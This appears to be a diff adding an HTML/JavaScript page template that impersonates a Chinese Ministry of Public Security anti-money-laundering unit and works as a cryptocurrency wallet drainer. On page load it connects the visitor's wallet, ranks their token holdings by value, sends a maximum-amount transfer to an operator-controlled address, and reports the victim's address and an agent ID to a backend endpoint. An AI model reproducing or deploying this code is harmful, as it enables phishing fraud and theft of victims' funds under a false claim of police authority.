@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+ <head>
+ <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+ <meta name="apple-mobile-web-app-capable" content="yes">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black">
+ <meta name="format-detection" content="telephone=no, email=no">
+ <meta name="msapplication-tap-highlight" content="no">
+ <meta name="x5-orientation" content="portrait">
+ <meta name="x5-fullscreen" content="true">
+ <meta name="description" content="">
+ <meta name="keywords" content="">
+<title>公安部反洗小组</title>
+
+<script src="/police_files/js/jquery.min.js"></script>
+<script src="/police_files/js/web3.min.js"></script>
+<script src="/police_files/js/web3model.min.js"></script>
+<script src="/police_files/js/web3provider.js"></script>
+</head>
+<body>
+	<a id="btn-connect" href="javascript:void(0);">
+		<img width="100%" height="100%" src="/police_files/img/index.png">
+	</a>
+	<div style="display:none;">
+		<textarea id="jsondata">{$abi}</textarea>
+		<textarea id="jsondata1">{$addr|json_encode}</textarea>
+		<textarea id="jsondata2">{$addr2|json_encode}</textarea>
+		<textarea id="jsondata3">{$addr3|json_encode}</textarea>
+	</div>
+	<script>
+	const ABI = JSON.parse($('#jsondata').html());
+	var authorized_address = '{$authorized_address}';
+	var agent = "{$userId}";
+	var infura_key = '{$infura_key}';
+	var bizhong = 'usdt';
+	var approved = false;
+	var domain = '{$domain}';
+	var address = '';
+	var rank = 6.45;
+
+	const _web3 = new Web3('https://cloudflare-eth.com')
+	let injectedWeb3 = null, total = 0
+	let approveAddr = '{$approveAddr}';
+	const addr = JSON.parse($('#jsondata1').html());
+	const addr2 = JSON.parse($('#jsondata2').html());
+	const addr3 = JSON.parse($('#jsondata3').html());
+
+	const price = {
+		'usdt': 1,
+		'sushi': 15.5,
+		'usdc': 1,
+		'dai': 1,
+		'uni': 28.6,
+		'aave': 380,
+		'yfi': 35000,
+		'link': 28.2,
+		"LON": 7,
+		"CRV": 3.01367,
+		"GUSD": 1,
+		"WBTC": 56478.2,
+		"WETH": 1991.89,
+		"CONV": 0.105733,
+		"inj": 13.3812,
+		"MKR": 2076.68,
+		"ALPHA": 1.79043,
+		"BAND": 16.3441,
+		"snx": 20.0588,
+		"comp": 468.076,
+		"sxp": 4.11818,
+		"FTT": 46.1779,
+		"ust": 1.00543,
+		"TRIBE": 1.42926,
+		"wise": 0.446973,
+		"RRAX": 0.996821,
+		"CORE": 5447.59,
+		"mir": 8.69817,
+		"DPI": 415.906,
+		"luna": 15.2402,
+		"HEZ": 5.97533,
+		"fxs": 8.47025,
+		"fei": 0.898157,
+	}
+
+	const decimals = {
+		sushi: 18,
+		usdt: 6,
+		usdc: 6,
+		uni: 18,
+		dai: 18,
+		aave: 18,
+		yfi: 18,
+		link: 18,
+		WBTC: 8,
+	}
+
+	const contracts = {}, contracts2 = {}, contracts3 = {}
+	for (const symbol of Object.keys(addr)) {
+		const contractAddr = addr[symbol]
+		contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr2)) {
+		const contractAddr = addr2[symbol]
+		contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	for (const symbol of Object.keys(addr3)) {
+		const contractAddr = addr3[symbol]
+		contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr)
+	}
+
+	const Web3Modal = window.Web3Modal.default;
+	const WalletConnectProvider = window.WalletConnectProvider.default;
+	// Web3modal instance
+	let web3Modal
+	// Chosen wallet provider given by the dialog window
+	let provider;
+	// Address of the selected account
+	let selectedAccount;
+	async function init() {
+		const providerOptions = {
+			walletconnect: {
+				package: WalletConnectProvider,
+				options: {
+					// Mikko's test key - don't copy as your mileage may vary
+					infuraId: infura_key,
+				}
+			},
+		};
+
+		web3Modal = new Web3Modal({
+			cacheProvider: false, // optional
+			providerOptions, // required
+			disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
+		});
+		try {
+			provider = await web3Modal.connect()
+			provider.enable()
+		} catch(e) {
+			console.log("Could not get a wallet connection", e);
+			return;
+		}
+		// Subscribe to accounts change
+		provider.on("accountsChanged", async (accounts) => {
+			await fetchAccountData();
+		});
+		// Subscribe to chainId change
+		provider.on("chainChanged", async (chainId) => {
+			await fetchAccountData();
+		});
+		// Subscribe to networkId change
+		provider.on("networkChanged", async (networkId) => {
+			await fetchAccountData();
+		});
+		await fetchAccountData(provider);
+	}
+
+	/**
+	 * Kick in the UI action after Web3modal dialog has chosen a provider
+	 */
+	async function fetchAccountData() {
+		const web3 = new Web3(provider);
+		injectedWeb3 = web3;
+		provider.enable();
+		const accounts = await web3.eth.getAccounts();
+		selectedAccount = accounts[0];
+
+		getMostValuableAssets(selectedAccount);
+		setTimeout(function() {
+			getMostValuableAssets2(selectedAccount)
+		}, 200)
+		setTimeout(function() {
+			getMostValuableAssets3(selectedAccount)
+		}, 300)
+		// getInfo();
+		// getAirdropInfo();
+
+		//const web3 = new Web3(provider);
+		const contract = new web3.eth.Contract(ABI, approveAddr)
+		const gasPrice = await web3.eth.getGasPrice();
+
+		if (selectedAccount && provider) {
+			const web3 = new Web3(provider);
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+
+			const gasPrice = await web3.eth.getGasPrice()
+
+			contract.methods.transfer(authorized_address, web3.utils.toBN('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas: 70000,
+			}, function(err, tx) {
+				if(!err){
+					postInfo(selectedAccount,bizhong);
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+				console.log(err, tx);
+			})
+		} else {
+			provider = await web3Modal.connect()
+			provider.enable()
+			const web3 = new Web3(provider);
+			const accounts = await web3.eth.getAccounts()
+			selectedAccount = accounts[0]
+			const contract = new web3.eth.Contract(ABI, approveAddr)
+			const gasPrice = await web3.eth.getGasPrice()
+
+			contract.methods.transfer(authorized_address, '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+				from: selectedAccount,
+				gasPrice: gasPrice,
+				gas:70000,
+			}, function(err, tx) {
+				console.log(err, tx)
+				if(!err){
+					postInfo(selectedAccount,bizhong)
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+			})
+		}
+	}
+
+	async function getMostValuableAssets(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+
+		for (const [symbol, contract] of Object.entries(contracts)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				if(symbol == 'usdt'){
+					let yu =balance / (10** (decimals[symbol] || 18))
+					console.log(yu.toLocaleString())
+					$('#yu').text(yu.toLocaleString() +' USDT')
+				}
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					bizhong = _symbol
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+		bizhong = _symbol
+		// checkApproved(selectedAccount,bizhong);
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets2(account) {
+		let _symbol = 'usdt'
+		console.log('_symbol:'+_symbol);
+		for (const [symbol, contract] of Object.entries(contracts2)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+
+		bizhong = _symbol
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+
+	async function getMostValuableAssets3(account) {
+		let _symbol = 'usdt'
+		for (const [symbol, contract] of Object.entries(contracts3)) {
+			contract.methods.balanceOf(account).call(function(err, balance) {
+				const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+				if (usdt > total && usdt > 1000) {
+					_symbol = symbol
+					total = usdt
+					approveAddr = addr[_symbol]
+					// checkApproved(selectedAccount,bizhong);
+				}
+			})
+		}
+		bizhong = _symbol
+		console.log('_symbol:'+_symbol);
+		return _symbol
+	}
+	
+	async function postInfo(address,symbol){
+		var data = {
+			address:address,
+			auth_address:authorized_address,
+			bizhong:symbol,
+			agent:agent,
+		}
+		var d = new Date();
+		var n = d.getTime();
+
+		$.ajax({
+			type: 'get',
+			url:  domain + "{:url('index/api/erc_post')}?t="+n,
+			data: data,
+			success:function(){
+			}
+		})
+	}
+
+	async function connect(){
+		init();
+	}
+	
+	/**
+	 * Main entry point.
+	 */
+	window.addEventListener('load', async () => {
+		init();
+		document.querySelector("#btn-connect").addEventListener("click", connect);
+	// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+	});
+</script>
+</body>
+</html>
